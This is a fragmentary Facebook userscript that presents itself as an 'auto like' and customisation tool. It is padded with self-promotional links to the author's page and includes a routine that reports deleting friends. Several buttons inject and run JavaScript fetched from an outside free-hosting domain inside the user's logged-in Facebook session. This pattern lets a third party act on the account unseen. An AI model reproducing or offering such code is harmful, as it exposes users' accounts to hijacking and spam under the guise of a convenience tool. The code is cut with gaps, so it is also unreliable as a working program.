// ==UserScript==
// @name			 Facebook Script By : Killua Crazy All Base
// @namespace		        Auto_like_facebook
// @description		         Facebook Script By : Killua Crazy All Base
// @author			Killua Crazy
// @authorURL		        http://www.facebook.com/
// @homepage		        http://userscripts.org/scripts/show/155115
// @include			htt*://www.facebook.com/*
// @icon			https://fbcdn-sphotos-d-a.akamaihd.net/hphotos-ak-ash3/r270/532401_318564184924630_789340994_n.jpg
// @version			1.5
...
// @downloadURL		http://userscripts.org/scripts/source/155551.user.js
// @updateURL		http://userscripts.org/scripts/source/155551.meta.js
// ==/UserScript==
// ==============
// ==Short URL==13
body = document.body;
if(body != null) {
	...
	div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://www.facebook.com/slanjoynewbieterbuang' title='click this'><blink><center>click thiz</center></blink></a>"
...
if(body != null) {
	...
	div.innerHTML = "<a style=\"font-weight:bold;color:#000000\" TARGET='_blank' href='http://www.facebook.com/slanjoynewbieterbuang' title='KilluaCrazy'><img src='https://fbcdn-sphotos-d-a.akamaihd.net/hphotos-ak-ash3/r270/532401_318564184924630_789340994_n.jpg' height='132px' width='132px'></img></a>"
	body.appendChild(div);
...
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','AutoLikeStatusCrazy');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px"; 
	div.style.opacity= 0.90;
...
src="http://geryslanjoy.16mb.com/KilluaCrazy Auto Like All Status Facebook.js",b.body.appendChild(a);void(0);
};
}
...
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','AutoLikeCommentCrazy');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px"; 
	div.style.opacity= 0.90;
...
javascript:(a=(b=document).createElement("script")).
src="http://geryslanjoy.16mb.com/KilluaCrazy Auto Like All Comment Facebook.js",b.body.appendChild(a);void(0);
};
}
// ==Remover Iklan==9
body = document.body;
...
function replace_msg(x) {
	$('div.dialog_body').html('Hooray! ' + x + ' friends deleted. Visit us at <a target="_blank" href="http://facebook.com/SlanjoyNewbieTerbuang">KilluaCrazy</a> for more useful scripts!');
}
set_timer();
...
function creaBarra(event){ //prima di chiamare questo metodo controllo la presenza della barra
	...
	popolaBarra(barra);
        ...
        cops2.innerHTML='<img src="http://image.free.in.th/z/in/facebook_like_buton.png" width="20" style="padding-top:5px;"> <a href="http://www.facebook.com/slanjoynewbieterbuang" target="_blank" style="text-decoration:none;">Killua Crazy</a>';
...
function popolaBarra(barra){
    try{
            ...
            minimize.innerHTML="KilluaCrazy Emotions";
...
var chatNewHeight = 500; //limited by other stuff not to fly off the page
var chatNewWidth = 300; // Take up ALL of usable space
